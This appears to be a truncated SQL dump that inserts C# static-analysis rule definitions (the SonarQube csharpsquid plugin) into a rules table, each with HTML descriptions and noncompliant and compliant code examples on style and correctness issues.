INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (369, 'Trivial properties should be auto-implemented', 'S2292', NULL, 'csharpsquid', '<p>
    Trivial properties, which include no logic but setting and getting a backing field should be converted to auto-implemented
    properties, yielding cleaner and more readable code.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Car
{
  private string _make;
  public string Make // Noncompliant
  {
    get { return _make; }
    set { _make = value; }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Car
{
  public string Make { get; set; }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812204, 1510817812205, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (361, 'An abstract class should have both abstract and concrete methods', 'S1694', NULL, 'csharpsquid', '<p>
    The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be
    implemented by sub-classes.
</p>
<p>
    A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a
    concrete class (i.e. remove the <code>abstract</code> keyword) with a private constructor.
</p>
<p>
    A class with only abstract methods and no inheritable behavior should be converted to an interface.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Animal //Noncompliant; should be an interface
{
  abstract void Move();
  abstract void Feed();
}

public abstract class Color //Noncompliant; should be concrete with a private constructor
{
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  public int GetRed()
  {
    return red;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public interface Animal
{
  void Move();
  void Feed();
}

public class Color
{
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  private Color()
  {}

  public int GetRed()
  {
    return red;
  }
}

public abstract class Lamp
{
  private bool switchLamp = false;

  public abstract void Glow();

  public void FlipSwitch()
  {
    switchLamp = !switchLamp;
    if (switchLamp)
    {
      Glow();
    }
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812194, 1510817812194, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (362, 'Methods with caller info attributes should not be invoked with explicit arguments', 'S3236', NULL, 'csharpsquid', '<p>
    Caller information attributes (<code>CallerFilePathAttribute</code>, <code>CallerLineNumberAttribute</code>, and
    <code>CallerMemberNameAttribute</code>) provide a way to get information about the caller of a method through optional parameters.
    But the arguments for these optional parameters are only generated if they are not explicitly defined in the call. Thus, specifying
    the argument values defeats the purpose of the attributes.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void TraceMessage(string message,
  [CallerMemberName] string memberName = "",
  [CallerFilePath] string filePath = "",
  [CallerLineNumber] int lineNumber = 0)
{
  /* ... */
}

void MyMethod()
{
  TraceMessage("my message", "MyMethod"); // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
void TraceMessage(string message,
  [CallerMemberName] string memberName = "",
  [CallerFilePath] string filePath = "",
  [CallerLineNumber] int lineNumber = 0)
{
  /* ... */
}

void MyMethod()
{
  TraceMessage("my message");
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812195, 1510817812196, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (363, 'Redundant parentheses should not be used', 'S3235', NULL, 'csharpsquid', '<p>
    Redundant parentheses are simply wasted keystrokes, and should be removed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
[MyAttribute()] //Noncompliant
class MyClass
{
  public int MyProperty { get; set; }
  public static MyClass CreateNew(int propertyValue)
  {
    return new MyClass() //Noncompliant
    {
      MyProperty = propertyValue
    };
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
[MyAttribute]
class MyClass
{
  public int MyProperty { get; set; }
  public static MyClass CreateNew(int propertyValue)
  {
    return new MyClass
    {
      MyProperty = propertyValue
    };
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'finding,unused', false, 'HTML', 1510817812197, 1510817812197, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (364, 'Short-circuit logic should be used to prevent null pointer dereferences in conditionals', 'S1697', NULL, 'csharpsquid', '<p>
When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely null-testing the object before dereferencing it.
Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced only if it is null, leading to a guaranteed null pointer dereference.
</p>

<h2>Noncompliant Code Sample</h2>
<pre>
if (str == null &amp;&amp; str.Length == 0)
{
  Console.WriteLine("String is empty");
}

if (str != null || str.Length > 0)
{
  Console.WriteLine("String is not empty");
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (str == null || str.Length == 0)
{
  Console.WriteLine("String is empty");
}

if (str != null &amp;&amp; str.Length > 0)
{
  Console.WriteLine("String is not empty");
}
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812198, 1510817812198, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (365, '"==" should not be used when "Equals" is overridden', 'S1698', NULL, 'csharpsquid', '<p>
    Using the equality <code>==</code> and inequality <code>!=</code> operators to compare two objects generally works. The operators
    can be overloaded, and therefore the comparison can resolve to the appropriate method. However, when the operators are used on
    interface instances, then <code>==</code> resolves to reference equality, which may result in unexpected behavior if implementing
    classes override <code>Equals</code>. Similarly, when a class overrides <code>Equals</code>, but instances are compared with
    non-overloaded <code>==</code>, there is a high chance that value comparison was meant instead of the reference one.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
}

public class MyClass : IMyInterface
{
    public override bool Equals(object obj)
    {
        //...
    }
}

public class Program
{
    public static void Method(IMyInterface instance1, IMyInterface instance2)
    {
        if (instance1 == instance2) // Noncompliant, will do reference equality check, but was that intended? MyClass overrides Equals.
        {
            Console.WriteLine("Equal");
        }
    }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{
}

public class MyClass : IMyInterface
{
    public override bool Equals(object obj)
    {
        //...
    }
}

public class Program
{
    public static void Method(IMyInterface instance1, IMyInterface instance2)
    {
        if (object.Equals(instance1, instance2)) // object.Equals checks for null and then calls the instance based Equals, so MyClass.Equals
        {
            Console.WriteLine("Equal");
        }
    }
}
</pre>

<h2>Exceptions</h2>
<p>
    The rule does not report on comparisons of <code>System.Type</code> instances and on comparisons inside <code>Equals</code> overrides.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812199, 1510817812200, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (366, '"value" parameters should be used', 'S3237', NULL, 'csharpsquid', '<p>
    In property and indexer <code>set</code> methods, and in event <code>add</code> and <code>remove</code> methods, the implicit
    <code>value</code> parameter holds the value the accessor was called with. Not using the <code>value</code> means that the
    accessor ignores the caller''s intent which could cause unexpected results at runtime.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private int count;
public int Count
{
  get { return count; }
  set { count = 42; } // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private int count;
public int Count
{
  get { return count; }
  set { count = value; }
}
</pre>
or
<pre>
public int Count
{
  get { return count; }
  set { throw new InvalidOperationException(); }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812200, 1510817812201, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (370, 'Static fields should appear in the order they must be initialized', 'S3263', NULL, 'csharpsquid', '<p>
    Static field initializers are executed in the order in which they appear in the class from top to bottom. Thus,
    placing a static field in a class above the field or fields required for its initialization will yield unexpected
    results.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  public static int X = Y; // Noncompliant; Y at this time is still assigned default(int), i.e. 0
  public static int Y = 42;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public static int Y = 42;
  public static int X = Y;
}
</pre>
or
<pre>
class MyClass
{
  public static int X;
  public static int Y = 42;

  static MyClass()
  {
    X = Y;
  }
}
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812205, 1510817812206, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (367, 'Overflow checking should not be disabled for "Enumerable.Sum"', 'S2291', NULL, 'csharpsquid', '<p>
    <code>Enumerable.Sum()</code> always executes addition in a <code>checked</code> context, so an
    <code>OverflowException</code> will be thrown if the value exceeds <code>MaxValue</code> even if an
    <code>unchecked</code> context was specified. Using an <code>unchecked</code> context anyway represents
    a misunderstanding of how <code>Sum</code> works.
</p>
<p>
    This rule raises an issue when an <code>unchecked</code> context is specified for a <code>Sum</code> on
    integer types.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void Add(List&lt;int&gt; list)
{
  int d = unchecked(list.Sum());  // Noncompliant

  unchecked
  {
    int e = list.Sum();  // Noncompliant
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
void Add(List&lt;int&gt; list)
{
  int d = list.Sum();

  try
  {
    int e = list.Sum();
  }
  catch (System.OverflowException e)
  {
    // exception handling...
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    When the <code>Sum()</code> call is inside a <code>try-catch</code> block, no issues are reported.
</p>

<pre>
void Add(List&lt;int&gt; list)
{
  unchecked
  {
    try
    {
      int e = list.Sum();
    }
    catch (System.OverflowException e)
    {
      // exception handling...
    }
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812201, 1510817812202, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (368, 'Field-like events should not be virtual', 'S2290', NULL, 'csharpsquid', '<p>
    Field-like events are events that do not have explicit <code>add</code> and <code>remove</code> methods. The compiler
    generates a <code>private</code> <code>delegate</code> field to back the event, as well as generating the implicit
    <code>add</code> and <code>remove</code> methods.
</p>
<p>
    When a <code>virtual</code> field-like <code>event</code> is overridden by another field-like <code>event</code>,
    the behavior of the C# compiler is to generate a new <code>private</code> <code>delegate</code> field in the derived
    class, separate from the parent''s field. This results in multiple and separate events being created, which is rarely
    what''s actually intended.
</p>
<p>
    To prevent this, remove the <code>virtual</code> designation from the parent class event.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
abstract class Car
{
  public virtual event EventHandler OnRefueled; // Noncompliant

  public void Refuel()
  {
    // This OnRefueld will always be null
     if (OnRefueled != null)
     {
       OnRefueled(this, null);
     }
  }
}

class R2 : Car
{
  public override event EventHandler OnRefueled;
}

class Program
{
  static void Main(string[] args)
  {
    var r2 = new R2();
    r2.OnRefueled += new EventHandler((o, a) =>
    {
      Console.WriteLine("This event will never be called");
    });
    r2.Refuel();
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
abstract class Car
{
  public event EventHandler OnRefueled; // Compliant

  public void Refuel()
  {
    if (OnRefueled != null)
    {
      OnRefueled(this, null);
    }
  }
}

class R2 : Car {}

class Program
{
  static void Main(string[] args)
  {
    var r2 = new R2();
    r2.OnRefueled += new EventHandler((o, a) =>
    {
      Console.WriteLine("This event will be called");
    });
    r2.Refuel();
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812203, 1510817812203, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (435, 'Tabulation characters should not be used', 'S105', NULL, 'csharpsquid', '<p>
Developers should not need to configure the tab width of their text editors in order to be able to read source code.
So the use of tabulation character must be banned.
</p>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812312, 1510817812312, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (371, '"params" should be used on overrides', 'S3262', NULL, 'csharpsquid', '<p>
    Overriding methods automatically inherit the <code>params</code> behavior. To ease readability, this modifier should be explicitly used in
    the overriding method as well.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  public virtual void Method(params int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(int[] numbers) // Noncompliant, the params is missing.
  {
    ...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Base
{
  public virtual void Method(params int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(params int[] numbers)
  {
    ...
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing', false, 'HTML', 1510817812206, 1510817812207, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (372, 'Unused local variables should be removed', 'S1481', NULL, 'csharpsquid', '<p>
If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will not wonder what the variable is used for.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public int numberOfMinutes(int hours)
{
  int seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public int numberOfMinutes(int hours)
{
  return hours * 60;
}
</pre>

<h2>Exceptions</h2>
<p>
    Unused locally created resources in a <code>using</code> statement are not reported.
</p>
<pre>
using(var t = new Timer()) // t never used, but compliant.
{
  //...
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817812208, 1510817812208, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (373, 'Method overloads with default parameter values should not overlap', 'S3427', NULL, 'csharpsquid', '<p>
    The rules for method resolution are complex and perhaps not properly understood by all coders. Having overloads with
    optional parameter values make the matter even harder to understand. An overload with default parameter values can be
    hidden by one without the optional parameters.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  void Print(string[] messages) {...}
  void Print(string[] messages, string delimiter = "\n") {...} // Noncompliant; default parameter value is hidden by overload
}

// ...
MyClass myClass = new MyClass();

myClass.Print(new string[3] {"yes", "no", "maybe"});  // which version of Print will be called?
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall,unused', false, 'HTML', 1510817812209, 1510817812209, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (374, 'Method overrides should use the same default parameter values as the base methods', 'S1006', NULL, 'csharpsquid', '<p>
    Default arguments are determined by the static type of the object. If a default argument is different for a parameter in an
    overriding method, the value used in the call will be different when calls are made via the base or derived object, which may
    be contrary to developer expectations.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 5) // Noncompliant
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 5
    Print(derived);  // writes 42; was that expected?
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
public class Base
{
  public virtual void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Derived : Base
{
  public override void Write(int i = 42)
  {
    Console.WriteLine(i);
  }
}

public class Program
{
  public static void Main()
  {
    var derived = new Derived();
    derived.Write(); // writes 42
    Print(derived);  // writes 42
  }
  private void Print(Base item)
  {
    item.Write();
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'misra,pitfall', false, 'HTML', 1510817812210, 1510817812210, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (375, 'Runtime type checking should be simplified', 'S2219', NULL, 'csharpsquid', '<p>
    To check the type of an object there are several options:
    <ul>
        <li>
            <code>expr is SomeType</code> or <code>expr.GetType() == typeof(SomeType)</code> if the
            type is known at compile time,</li>
        <li><code>typeInstance.IsInstanceOfType(expr)</code> if the type is calculated during runtime.</li>
    </ul>
</p>
<p>
    If runtime calculated <code>Type</code>s need to be compared:
    <ul>
        <li><code>typeInstance1.IsAssignableFrom(typeInstance2)</code>.</li>
    </ul>
</p>
<p>
    Depending on whether the type is returned by a <code>GetType()</code> or <code>typeof()</code> call, the <code>IsAssignableFrom()</code> and
    <code>IsInstanceOfType()</code> might be simplified. Similarly, if the type is sealed, the type comparison with <code>==</code> can be converted
    to an <code>is</code> call. Simplifying the calls also make <code>null</code> checking unnecessary because both <code>is</code> and
    <code>IsInstanceOfType</code> performs it already.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Fruit { }
sealed class Apple : Fruit { }

class Program
{
  static void Main()
  {
    var apple = new Apple();
    var b = apple != null &amp;&amp; apple.GetType() == typeof (Apple); // Noncompliant
    b = typeof(Apple).IsInstanceOfType(apple); // Noncompliant
    if (apple != null)
    {
      b = typeof(Apple).IsAssignableFrom(apple.GetType()); // Noncompliant
    }
    var appleType = typeof (Apple);
    if (apple != null)
    {
      b = appleType.IsAssignableFrom(apple.GetType()); // Noncompliant
    }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Fruit { }
sealed class Apple : Fruit { }

class Program
{
  static void Main()
  {
    var apple = new Apple();
    var b = apple is Apple;
    b = apple is Apple;
    b = apple is Apple;
    var appleType = typeof(Apple);
    b = appleType.IsInstanceOfType(apple);
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812211, 1510817812212, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (376, 'Public constant members should not be used', 'S2339', NULL, 'csharpsquid', '<p>
    Constant members are copied at compile time to the call sites, instead of being fetched at runtime.
</p>
<p>
    As an example, say you have a library with a constant <code>Version</code> member set to <code>1.0</code>, and a
    client application linked to it. This library is then updated and <code>Version</code> is set to <code>2.0</code>.
    Unfortunately, even after the old DLL is replaced by the new one, <code>Version</code> will still be <code>1.0</code>
    for the client application. In order to see <code>2.0</code>, the client application would need to be rebuilt
    against the new version of the library.
</p>
<p>
    This means that you should use constants to hold values that by definition will never change, such as <code>Zero</code>.
    In practice, those cases are uncommon, and therefore it is generally better to avoid constant members.
</p>
<p>
    This rule only reports issues on public constant fields, which can be reached from outside the defining assembly.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    public const double Version = 1.0;           // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>

<pre>
public class Foo
{
    public static double Version
    {
      get { return 1.0; }
    }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812213, 1510817812213, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (377, '"catch" clauses should do more than rethrow', 'S2737', NULL, 'csharpsquid', '<p>
A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting it bubble up automatically, but with more code and the additional detrement of leaving maintainers scratching their heads.
Such clauses should either be eliminated or populated with the appropriate logic.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
string s = "";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e) // Noncompliant
{
  throw;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
string s = "";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e)
{
  logger.LogError(e);
  throw;
}
</pre>
or
<pre>
string s = File.ReadAllText(fileName);
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,finding,unused', false, 'HTML', 1510817812214, 1510817812215, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (436, 'Lines should not be too long', 'S103', NULL, 'csharpsquid', '<p>
Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.
</p>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812313, 1510817812313, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (378, 'Array covariance should not be used', 'S2330', NULL, 'csharpsquid', '<p>
    Array covariance is the principle that if an implicit or explicit reference conversion exits from type <code>A</code> to
    <code>B</code>, then the same conversion exists from the array type <code>A[]</code> to <code>B[]</code>.
</p>
<p>
    While this array conversion can be useful in readonly situations to pass instances of <code>A[]</code> wherever
    <code>B[]</code> is expected, it must be used with care, since assigning an instance of <code>B</code> into an array of
    <code>A</code> will cause an <code>ArrayTypeMismatchException</code> to be thrown at runtime.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
abstract class Fruit { }
class Apple : Fruit { }
class Orange : Fruit { }

class Program
{
  static void Main(string[] args)
  {
    Fruit[] fruits = new Apple[1]; // Noncompliant - array covariance is used
    FillWithOranges(fruits);
  }

  // Just looking at the code doesn''t reveal anything suspicious
  static void FillWithOranges(Fruit[] fruits)
  {
    for (int i = 0; i < fruits.Length; i++)
    {
      fruits[i] = new Orange(); // Will throw an ArrayTypeMismatchException
    }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
abstract class Fruit { }
class Apple : Fruit { }
class Orange : Fruit { }

class Program
{
  static void Main(string[] args)
  {
    Orange[] fruits = new Orange[1]; // Compliant
    FillWithOranges(fruits);
  }

  static void FillWithOranges(Orange[] fruits)
  {
    for (int i = 0; i < fruits.Length; i++)
    {
      fruits[i] = new Orange();
    }
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812215, 1510817812216, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (379, 'Method name should comply with a naming convention', 'S100', NULL, 'csharpsquid', '<p>
    Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided
    regular expression.
</p>

<p>The following code:</p>

<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$</code>:</p>
<pre>
public int doSomething(){...}
</pre>

<p>should be refactored into:</p>

<pre>
public int DoSomething(){...}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812217, 1510817812217, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (380, 'Non-flags enums should not be used in bitwise operations', 'S3265', NULL, 'csharpsquid', '<p>
